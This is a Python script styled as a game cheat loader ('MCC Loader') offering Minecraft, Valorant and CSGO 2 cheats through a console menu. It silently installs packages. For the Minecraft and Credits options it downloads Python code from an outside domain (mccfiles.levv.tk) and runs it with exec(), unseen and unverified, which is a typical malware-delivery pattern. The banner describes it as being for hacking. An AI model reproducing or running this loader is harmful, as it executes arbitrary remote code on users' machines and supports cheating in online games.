import sys
import time
from time import sleep, strftime
from datetime import datetime
import threading
import webbrowser, os, re, json, random
import msvcrt
try:
    from faker import Faker
    from requests import session
    from colorama import Fore, Style
    import requests, random, re
    from random import choice, randint, shuffle
    import requests, pystyle
except:
    os.system("pip install faker")
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system('pip install requests && pip install bs4 && pip install pystyle && pip install pycryptodome')
    print('__Minecraft Cheater Central__')
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System

banner = r"""                                               Dùng Cho hack thôi nhá



                        _______     _________ _    _  ____  _   _    _______ ______  _____ _______ 
               /\      |  __ \ \   / /__   __| |  | |/ __ \| \ | |  |__   __|  ____|/ ____|__   __|
              /  \     | |__) \ \_/ /   | |  | |__| | |  | |  \| |     | |  | |__  | (___    | |   
             / /\ \    |  ___/ \   /    | |  |  __  | |  | | . ` |     | |  |  __|  \___ \   | |   
            / ____ \   | |      | |     | |  | |  | | |__| | |\  |     | |  | |____ ____) |  | |   
           /_/    \_\  |_|      |_|     |_|  |_|  |_|\____/|_| \_|     |_|  |______|_____/   |_|   
                                                                                         
                                                                                         



                                              Press ENTER to continue.                                                                                      
"""[1:]
Anime.Fade(Center.Center(banner), Colors.blue_to_green, Colorate.Vertical, enter=True)
# MÀU
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb = "\033[1;39m"
red = "\033[0;31m"
redb = "\033[1;31m"
end = '\033[0m'
# BY THAT VAPE USER
dev = "\033[1;39m[\033[1;31m×\033[1;39m]\033[1;39m"


def banner():
    banner = f"""Tutorial : https://www.youtube.com/watch?v=yZ8ZLNQqpUY                                                      
\033[1;39mType - if you want to return to the previous page.   

            \033[1;32m\033[1;39mWhat's new in MCC Loader 0.8.8 ? Checkout new feature & cheats here : https://discord.gg/WvRVq4EppP


                          \033[1;36m______  ___________________   ______              _________            
                          \033[1;36m___   |/  /_  ____/_  ____/   ___  / ____________ ______  /____________
                          \033[1;36m__  /|_/ /_  /    _  /        __  /  _  __ \  __ `/  __  /_  _ \_  ___/
                          \033[1;36m_  /  / / / /___  / /___      _  /___/ /_/ / /_/ // /_/ / /  __/  /    
                          \033[1;36m/_/  /_/  \____/  \____/      /_____/\____/\__,_/ \__,_/  \___//_/                                                                            

                                                         \033[1;31m[\033[1;39mC\033[1;31m]
\033[1;39m                                                    \033[1;35m For credits.
   \033[0;31m                                            Choose your favourite game.
"""
    for X in banner:
        sys.stdout.write(X)
        sys.stdout.flush()
        sleep(0.000001)


# =======================[RUN]=======================#
while True:
    os.system('cls')
    banner()
    print("                                ")
    print(
        "                                    \033[1;31m[\033[1;39m1\033[1;31m] \033[1;32mMinecraft \033[1;31m[\033[1;33mNEW\033[1;31m]          \033[1;31m[\033[1;39m2\033[1;31m] \033[1;32mValorant ")
    print(
        "                                    \033[1;31m[\033[1;39m3\033[1;31m] \033[1;32mCSGO 2 \033[1;31m[\033[1;33mNEW\033[1;31m]             \033[1;31m[\033[1;39m4\033[1;31m] \033[1;32mCall Of Duty \033[0;31m[LOCKED]")
    print(
        "                                    \033[1;31m[\033[1;39m5\033[1;31m] \033[1;32mFortnite \033[0;31m[LOCKED]        \033[1;31m[\033[1;39m6\033[1;31m] \033[1;32mRoblox \033[0;31m[LOCKED]")
    print("                                                \033[1;31m[\033[1;39mSS\033[1;31m] \033[1;32mScreen Share Tools")
    print("")
    chon = input(
        '                                                   \033[1;39m[\033[1;32mCHOOSE\033[1;39m]\033[1;39m: \033[0;31m')
    if chon == '1':
        print("                                              \033[1;39mLoading Minecraft Section..")
        exec(requests.get('https://mccfiles.levv.tk/minecraft.py').text)
    if chon == 'c' and 'C':
        print("                                                  \033[1;39mLoading Credits..")
        exec(requests.get('https://mccfiles.levv.tk/Credits.py').text)
    else:
        continue
